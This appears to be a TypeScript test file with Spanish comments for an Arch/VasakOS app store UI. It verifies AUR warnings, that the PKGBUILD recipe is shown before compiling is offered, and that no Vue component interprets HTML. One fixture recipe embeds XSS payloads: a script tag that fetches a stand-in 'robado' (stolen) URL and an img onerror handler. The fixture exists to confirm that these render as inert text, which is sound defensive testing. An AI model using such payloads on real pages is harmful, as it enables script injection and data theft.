/**
 * El AUR está marcado como inseguro, y eso tiene que verse y **sostenerse** en
 * la interfaz.
 *
 * Son cuatro cosas concretas, y las cuatro se pierden fácil en un rediseño: la
 * insignia distinta, la advertencia en la ficha, que la receta se muestre tal
 * cual y —la que importa— que no haya forma de compilar algo del AUR sin haber
 * tenido el PKGBUILD delante. Eso último es lo único que hace que «inseguro»
 * signifique algo más que un cartel.
 *
 * Antes esto se comprobaba leyendo los fuentes. Para lo que importaba, mal: que
 * el archivo no diga `v-html` no dice que un PKGBUILD con una etiqueta adentro
 * llegue como texto, y contar cuántas veces aparece `@click="compilar"` no dice
 * que ese botón no esté en pantalla antes de mostrar la receta. Acá se monta y
 * se aprieta.
 */

import { beforeEach, describe, expect, test } from 'bun:test';
import { mount } from '@vue/test-utils';
import InsigniaDeOrigen from '@/components/tienda/InsigniaDeOrigen.vue';
import type { Tarjeta } from '@/tools/api';
import DescubrirView from '@/views/DescubrirView.vue';
import DetalleView from '@/views/DetalleView.vue';
import { olvidarTodo, pedidos, responder } from './dobles';
import { sinArrastre, unaApp, unaFicha } from './ejemplos';
import { asentar, montarVista } from './montar';

const es = await Bun.file(new URL('../src-tauri/locales/es.yml', import.meta.url)).text();
const en = await Bun.file(new URL('../src-tauri/locales/en.yml', import.meta.url)).text();

/** Algo del AUR, que es lo que todo este archivo mira. */
function delAur(cambios: Partial<Tarjeta> = {}): Partial<Tarjeta> {
	return { nombre: 'yay', titulo: 'Yay', origen: 'aur', repositorio: 'aur', ...cambios };
}

/** Abre la ficha de algo del AUR. */
async function laFichaDeYay(receta = 'pkgname=yay\nbuild() { go build; }') {
	responder('detalle', unaFicha(delAur()));
	responder('receta_del_aur', receta);
	responder('instalar_del_aur', 'op-9');
	responder('previsualizar', sinArrastre());
	const montada = await montarVista(DetalleView, '/app/aur/yay');
	await asentar();
	return montada;
}

/** El botón principal de la cabecera, que es el que cambia según el origen. */
function elBotonPrincipal(vista: ReturnType<typeof mount>) {
	return vista.get('header button[class*="bg-primary"]');
}

beforeEach(() => {
	olvidarTodo();
});

describe('la insignia', () => {
	test('la del AUR se distingue por color y no sólo por texto', () => {
		// Una insignia que se distinga sólo por un tono de gris no comunica «la
		// distribución trata esto como inseguro».
		const aur = mount(InsigniaDeOrigen, { props: { origen: 'aur', repositorio: 'aur' } });
		const repositorio = mount(InsigniaDeOrigen, {
			props: { origen: 'repositorio', repositorio: 'extra' },
		});

		expect(aur.get('span').classes().join(' ')).toContain('status-warning');
		expect(repositorio.get('span').classes().join(' ')).not.toContain('status-warning');
	});

	test('y explica qué significa al pasar por encima', () => {
		const aur = mount(InsigniaDeOrigen, { props: { origen: 'aur', repositorio: 'aur' } });

		expect(aur.get('span').attributes('title')).toBe('origen.aurNota');
		expect(aur.text()).toBe('origen.aur');
	});

	test('la de un repositorio dice cuál, que es lo que lo distingue', () => {
		// «Repositorio» a secas no dice nada: `extra` y el de VasakOS no son lo
		// mismo para quien decide si instalar algo.
		const insignia = mount(InsigniaDeOrigen, {
			props: { origen: 'repositorio', repositorio: 'vasakos' },
		});

		expect(insignia.text()).toBe('vasakos');
	});
});

describe('desde una lista de resultados', () => {
	test('el botón de una tarjeta del AUR no instala: lleva a la ficha', async () => {
		// El camino completo, que cruza tres componentes: la tarjeta le pasa el
		// origen al botón, el botón emite `receta` en vez de `instalar`, y la
		// portada convierte eso en abrir la ficha. Cualquiera de los tres que se
		// rompa deja instalar del AUR sin ver el PKGBUILD.
		responder('ajustes', { aur: true });
		responder('buscar', { resultados: [unaApp(delAur())], total: 1 });
		responder('descubrir', { seleccion: [], novedades: [], categorias: [] });
		const { vista, router } = await montarVista(DescubrirView, '/descubrir?q=yay');
		await asentar();

		const boton = vista.get('article button');
		expect(boton.text()).toBe('tarjeta.receta');
		await boton.trigger('click');
		await asentar();

		expect(pedidos('previsualizar')).toHaveLength(0);
		expect(pedidos('instalar_del_aur')).toHaveLength(0);
		expect(router.currentRoute.value.fullPath).toBe('/app/aur/yay');
	});

	test('mientras que uno de los repositorios sí se instala desde ahí', async () => {
		// El control de los de arriba: si la tarjeta no instalara nunca, pasarían
		// igual sin comprobar nada.
		responder('ajustes', { aur: false });
		responder('buscar', { resultados: [unaApp()], total: 1 });
		responder('descubrir', { seleccion: [], novedades: [], categorias: [] });
		responder('previsualizar', sinArrastre());
		const { vista } = await montarVista(DescubrirView, '/descubrir?q=krita');
		await asentar();

		await vista.get('article button').trigger('click');
		await asentar();

		expect(pedidos('previsualizar')[0]?.argumentos.paquetes).toEqual(['krita']);
	});
});

describe('en la ficha', () => {
	test('la advertencia está en la cabecera, junto a los botones', async () => {
		// Abajo del todo se lee después de haber decidido.
		const { vista } = await laFichaDeYay();

		expect(vista.get('header').text()).toContain('origen.aurNota');
	});

	test('el botón principal pide la receta y no compila', async () => {
		const { vista } = await laFichaDeYay();
		expect(elBotonPrincipal(vista).text()).toBe('detalle.verReceta');

		await elBotonPrincipal(vista).trigger('click');
		await asentar();

		expect(pedidos('receta_del_aur')[0]?.argumentos.nombre).toBe('yay');
		expect(pedidos('instalar_del_aur')).toHaveLength(0);
	});

	test('compilar no se ofrece en ningún lado hasta haber mostrado la receta', async () => {
		// Es el control entero. Que el botón exista antes —escondido, en otro
		// panel, en un menú— convierte a la receta en un paso opcional.
		const { vista } = await laFichaDeYay();

		expect(vista.findAll('button').map((boton) => boton.text())).not.toContain(
			'detalle.compilarEInstalar'
		);

		await elBotonPrincipal(vista).trigger('click');
		await asentar();

		const dialogo = vista.get('[role="dialog"]');
		expect(dialogo.findAll('button').map((boton) => boton.text())).toContain(
			'detalle.compilarEInstalar'
		);
		// Y el que compila está adentro del diálogo, no suelto en la ficha.
		expect(
			vista
				.findAll('button')
				.filter((boton) => boton.text() === 'detalle.compilarEInstalar')
		).toHaveLength(1);
	});

	test('y el diálogo avisa que eso es lo que se va a ejecutar', async () => {
		const { vista } = await laFichaDeYay();

		await elBotonPrincipal(vista).trigger('click');
		await asentar();

		expect(vista.get('[role="dialog"]').text()).toContain('detalle.recetaNota');
	});

	test('si la receta no se pudo traer, no se abre nada que se pueda confirmar', async () => {
		// Sin receta no hay control; ofrecer compilar igual sería saltearlo con
		// la excusa de un error de red.
		responder('detalle', unaFicha(delAur()));
		responder('receta_del_aur', () => {
			throw new Error('no se pudo contactar al AUR');
		});
		const { vista } = await montarVista(DetalleView, '/app/aur/yay');
		await asentar();

		await elBotonPrincipal(vista).trigger('click');
		await asentar();

		expect(vista.find('[role="dialog"]').exists()).toBe(false);
		expect(vista.text()).toContain('no se pudo contactar al AUR');
	});
});

describe('la receta se muestra, no se ejecuta', () => {
	/** Un PKGBUILD con cosas que un navegador interpretaría. */
	const CON_ETIQUETAS = [
		'pkgname=malo',
		'# <script>fetch("http://ejemplo/robado")</script>',
		'# <img src=x onerror="alert(1)">',
		'build() { echo "a > b && c"; }',
	].join('\n');

	test('una etiqueta adentro del PKGBUILD llega como texto', async () => {
		// El PKGBUILD lo escribió cualquiera y se muestra en la ventana que le
		// habla al servicio que instala paquetes. Interpretado, alcanza con
		// subir una receta con una etiqueta para ejecutar algo acá sin que nadie
		// apriete «compilar».
		const { vista } = await laFichaDeYay(CON_ETIQUETAS);

		await elBotonPrincipal(vista).trigger('click');
		await asentar();

		const receta = vista.get('[role="dialog"] pre');
		expect(receta.text()).toContain('<script>fetch("http://ejemplo/robado")</script>');
		expect(receta.text()).toContain('<img src=x onerror="alert(1)">');
		// Y nada de eso llegó a ser un elemento.
		expect(receta.element.querySelector('script')).toBeNull();
		expect(receta.element.querySelector('img')).toBeNull();
		expect(receta.element.children).toHaveLength(0);
	});

	test('y los símbolos del shell se leen tal cual', async () => {
		// Un `>` o un `&&` escapados de más convierten la receta en algo que no
		// es la receta, y lo que hay que poder leer es exactamente lo que se va
		// a ejecutar.
		const { vista } = await laFichaDeYay(CON_ETIQUETAS);

		await elBotonPrincipal(vista).trigger('click');
		await asentar();

		expect(vista.get('[role="dialog"] pre').text()).toContain('echo "a > b && c"');
	});
});

describe('lo que no se puede montar', () => {
	// Dos comprobaciones sobre archivos: una sobre los textos, que son datos, y
	// otra sobre todos los `.vue` a la vez. Montar cubre el componente que se
	// monta; que **ninguno** interprete HTML no se comprueba montando de a uno.

	test('ningún componente interpreta HTML', async () => {
		// `v-html` en cualquier lado es una puerta: los nombres, los resúmenes y
		// las descripciones salen del catálogo de AppStream y de la base de
		// pacman, que no escribimos nosotros.
		const vue = new Bun.Glob('src/**/*.vue');
		const mirados: string[] = [];
		const conVHtml: string[] = [];
		for await (const ruta of vue.scan({ cwd: new URL('..', import.meta.url).pathname })) {
			const fuente = await Bun.file(new URL(`../${ruta}`, import.meta.url)).text();
			mirados.push(ruta);
			if (fuente.includes('v-html')) {
				conVHtml.push(ruta);
			}
		}

		// Primero que haya mirado algo: esta prueba afirma una ausencia, y el día
		// que el patrón deje de encontrar archivos —una carpeta que se mueve—
		// pasaría sola justo cuando dejó de comprobar nada.
		expect(mirados.length).toBeGreaterThan(20);
		expect(conVHtml).toEqual([]);
	});

	test('cada origen tiene su nota, en los dos idiomas', () => {
		// La insignia las muestra al pasar por encima; una que falte deja la
		// clave cruda en pantalla justo donde se explica el nivel de confianza.
		for (const clave of ['repositorioNota', 'aurNota', 'appimageNota', 'localNota']) {
			expect(es).toContain(`${clave}:`);
			expect(en).toContain(`${clave}:`);
		}
		expect(es).toContain('recetaNota:');
		expect(en).toContain('recetaNota:');
	});
});
